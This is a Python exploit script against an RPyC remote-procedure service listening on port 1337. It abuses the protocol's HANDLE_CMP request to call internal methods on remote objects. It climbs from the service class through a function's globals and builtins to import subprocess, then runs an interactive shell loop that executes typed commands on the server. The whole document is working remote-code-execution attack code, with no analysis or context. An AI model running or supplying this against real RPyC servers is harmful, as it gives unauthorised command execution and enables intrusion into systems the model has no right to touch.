#!/usr/bin/env python3

import rpyc

c = rpyc.connect("127.0.0.1", port=1337)

# Get a NetRef to the service
c.root

def call_method(object, method, arg):
    # The remote will handle this with
    # `getattr(type(object), method)(object, arg)`
    return c.sync_request(rpyc.core.consts.HANDLE_CMP, object, arg, method)

def _getattr(object, name):
    # Call the internal __getattribute__
    return call_method(object, '__getattribute__', name)

def _getitem(object, name):
    # Call the internal __getitem__
    return call_method(object, '__getitem__', name)

# Retrieve service's class
the_class = _getattr(c._remote_root, "__class__")
# Retrieve a reference to a function in the class
a_func = _getattr(the_class, "get_service_aliases")
# Get the function's 'globals'; i.e. the Python globals
globals = _getattr(a_func, "__globals__")
# Retrieve a reference to the builtins module
builtins = _getitem(globals, "__builtins__")
# Retrieve a reference to the import function
imp = _getitem(builtins, "__import__")
# Import the os module and get a reference to it
sp = imp('subprocess')
# Get a reference to getoutput
system = _getattr(sp, "getoutput")
while True:
    print(system(input("> ")))
